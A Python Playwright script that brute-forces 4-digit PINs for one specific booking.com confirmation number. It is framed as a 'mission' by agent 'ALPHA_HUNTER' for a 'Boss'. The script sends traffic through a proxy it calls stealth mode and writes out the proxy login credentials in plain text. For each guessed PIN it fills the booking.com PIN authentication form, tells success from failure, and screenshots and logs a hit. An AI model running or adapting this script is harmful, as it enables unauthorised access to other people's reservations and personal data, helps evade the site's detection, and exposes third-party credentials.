from playwright.sync_api import sync_playwright
import os
import time
import random

# --- Agent A Configuration ---
AGENT_NAME = "ALPHA_HUNTER"
CONFIRMATION = "6339614781"  # Boss provided booking ID
AGENT_ID = "A"

# Generate 5 random PINs from 0000-9999
def get_random_pins(count=5):
    pins = []
    for _ in range(count):
        pin = f"{random.randint(0, 9999):04d}"
        pins.append(pin)
    return pins

PINS = get_random_pins(5)
WAIT_TIME = 10
HEADLESS = False
LOG_FILE = f"mission_log_{AGENT_ID}.csv"
SCREEN_DIR = f"mission_screenshots_{AGENT_ID}"

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')},{AGENT_NAME},{CONFIRMATION},{pin},{result},{url}\n")

print(f"🎯 {AGENT_NAME} DEPLOYING...")
print(f"🎯 Target: {CONFIRMATION}")
print(f"🔑 Testing PINs: {', '.join(PINS)}")

success_count = 0
fail_count = 0
unknown_count = 0
exception_count = 0

with sync_playwright() as p:
    print("🚀 Starting Playwright...")
    
    # PROXY CONFIGURATION - STEALTH MODE ACTIVATED!
    proxy_config = {
        "server": "https://pr.oxylabs.io:7777",
        "username": "customer-oxy1p_hnzsA",
        "password": "oxy1p_hnzsA1"
    }
    print(f"🛡️ STEALTH MODE: Proxy configured - {proxy_config['server']}")
    
    browser = p.chromium.launch(
        headless=HEADLESS,
        proxy=proxy_config
    )
    print(f"🌐 Browser launched with PROXY STEALTH!")
    page = browser.new_page()
    print("📄 New page created with stealth protection")

    for pin in PINS:
        print(f"\n🔁 Testing PIN: {pin}")
        
        # LOGIC 1: Open browser and wait until completely loaded
        print("🌐 Opening booking.com...")
        page.goto("https://secure.booking.com/help/confirmation_pin_auth")
        print("⏳ Waiting for page to load completely...")
        page.wait_for_load_state("networkidle")  # Wait until no network activity
        print("✅ Page loaded completely!")

        try:
            # LOGIC 2: Fill booking ID and PIN, then click continue
            print("📝 Looking for booking ID field...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
            print(f"📝 Filling booking ID: {CONFIRMATION}")
            page.fill('input[placeholder="e.g. 1234567890"]', CONFIRMATION)
            
            print(f"🔐 Filling PIN: {pin}")
            page.fill('input[placeholder="e.g. 1234"]', pin)
            
            print("🔍 Looking for Continue button...")
            try:
                page.wait_for_selector('button:has-text("Continue")')
                print("✅ Clicking Continue button...")
                page.click('button:has-text("Continue")')
            except:
                page.wait_for_selector('button[type="submit"]')
                print("✅ Clicking Submit button...")
                page.click('button[type="submit"]')

            # LOGIC 3: Wait for results - either error banner OR URL change
            print("⏳ Waiting for results...")
            print("⏳ Giving extra time for page to redirect...")
            time.sleep(5)  # Extra wait for redirect
            
            # Wait for either success (URL change) or error banner to appear
            try:
                page.wait_for_function("""
                    () => {
                        // Check if URL contains success indicator
                        const urlChanged = window.location.href.includes('unique_order_id') || 
                                         window.location.href.includes('booking_details') ||
                                         window.location.href.includes('confirmation') ||
                                         window.location.href.includes('/help/reservation');
                        
                        // Check if error banner appears
                        const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                          document.querySelector('[class*="error"]') !== null ||
                                          document.querySelector('.alert-danger') !== null;
                        
                        return urlChanged || errorBanner;
                    }
                """, timeout=30000)
            except:
                print("⚠️ No clear result after 30s, checking current state...")

            # Check results
            current_url = page.url
            print(f"🔍 Current URL: {current_url}")
            
            # Debug: Check for various elements on the page
            print("🔍 Debugging page content...")
            page_content = page.content()
            print(f"🔍 Page title: {page.title()}")
            
            # Check if there are any error elements
            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
            print(f"🔍 Error elements found: {len(error_elements)}")
            
            # Check for SUCCESS: URL contains success indicators
            if ("unique_order_id" in current_url or 
                "booking_details" in current_url or 
                "/help/reservation" in current_url):
                print(f"🎉 SUCCESS! PIN {pin} is CORRECT! (URL changed)")
                print(f"✅ Success URL: {current_url}")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_SUCCESS.png")
                log_result(pin, "SUCCESS", current_url)
                success_count += 1
                print("🎉 SUCCESS FOUND! Pausing 30 seconds to see the page...")
                time.sleep(30)  # Pause to see the result
                break  # Stop testing, we found the PIN!
                
            # Check for FAILURE: Help page indicates wrong PIN
            elif "help/confirmation_pin_auth" in current_url:
                # Additional check for content on help page
                page_text = page.inner_text('body')
                if ("invalid" in page_text.lower() or 
                    "incorrect" in page_text.lower() or 
                    "wrong" in page_text.lower() or
                    "authentication failed" in page_text.lower()):
                    print(f"❌ PIN {pin} is INCORRECT (redirected to help page with error)")
                    page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_FAIL.png")
                    log_result(pin, "FAILURE", current_url)
                    fail_count += 1
                    print("❌ HELP PAGE ERROR! Pausing 10 seconds...")
                    time.sleep(10)
                else:
                    print(f"❓ PIN {pin} redirected to help page - checking content...")
                    page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_HELP.png")
                    print(f"📄 Help page content preview: {page_text[:200]}...")
                    log_result(pin, "HELP_PAGE", current_url)
                    unknown_count += 1
                    print("❓ HELP PAGE! Pausing 15 seconds...")
                    time.sleep(15)
                
            # Check for FAILURE: error banner detected
            elif len(error_elements) > 0:
                print(f"❌ PIN {pin} is INCORRECT (error banner detected)")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_FAIL.png")
                log_result(pin, "FAILURE", current_url)
                fail_count += 1
                print("❌ ERROR DETECTED! Pausing 10 seconds to see the page...")
                time.sleep(10)  # Pause to see the error
                
            else:
                print(f"❓ Unknown result for PIN {pin}")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_UNKNOWN.png")
                log_result(pin, "UNKNOWN", current_url)
                unknown_count += 1
                print("❓ UNKNOWN RESULT! Pausing 15 seconds to see the page...")
                time.sleep(15)  # Pause to see what happened

        except Exception as e:
            print(f"💥 Error testing PIN {pin}: {e}")
            page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_EXCEPTION.png")
            log_result(pin, "EXCEPTION", page.url)
            exception_count += 1

        # Small pause before next PIN
        if len(PINS) > 1:
            print(f"⏳ Waiting {WAIT_TIME}s before next PIN...")
            time.sleep(WAIT_TIME)

    browser.close()

print(f"\n--- {AGENT_NAME} Summary Report ---")
print(f"Target: {CONFIRMATION}")
print(f"Total attempts: {len(PINS)}")
print(f"Success: {success_count}")
print(f"Failure: {fail_count}")
print(f"Unknown: {unknown_count}")
print(f"Exception: {exception_count}")
